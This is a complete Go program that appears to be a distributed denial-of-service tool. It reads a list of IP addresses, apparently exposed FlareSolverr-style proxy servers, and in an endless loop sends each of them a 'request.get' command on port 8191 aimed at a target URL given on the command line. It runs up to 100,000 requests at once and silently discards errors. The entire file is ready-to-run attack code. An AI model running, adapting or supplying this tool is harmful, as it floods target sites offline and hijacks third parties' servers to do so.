package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	concurrencyLimit = 100000
	requestTimeout   = 60 * time.Second
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run main.go <url>")
		return
	}

	url := os.Args[1]
	ipList, err := readIPsFromFile("list.txt")
	if err != nil {
		fmt.Println("Error reading IP list:", err)
		return
	}

	semaphore := make(chan struct{}, concurrencyLimit)

	for {
		var wg sync.WaitGroup

		for _, ip := range ipList {
			wg.Add(1)
			semaphore <- struct{}{}

			go func(ip string) {
				defer func() {
					<-semaphore
					wg.Done()
				}()

				makeRequest(ip, url)
			}(ip)
		}

		wg.Wait()

		time.Sleep(time.Second)
	}
}

func readIPsFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ips []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ip := strings.TrimSpace(scanner.Text())
		if ip != "" {
			ips = append(ips, ip)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return ips, nil
}

func makeRequest(ip, url string) {
	postData := fmt.Sprintf(`{
		"cmd": "request.get",
		"url": "%s",
		"maxTimeout": 60000
	}`, url)

	client := http.Client{
		Timeout: requestTimeout,
	}

	go func() {
		_, err := client.Post(fmt.Sprintf("http://%s:8191/v1", ip), "application/json", strings.NewReader(postData))
		if err != nil {
			// fmt.Printf("Request to %s failed: %s\n", ip, err)
		}
	}()
}
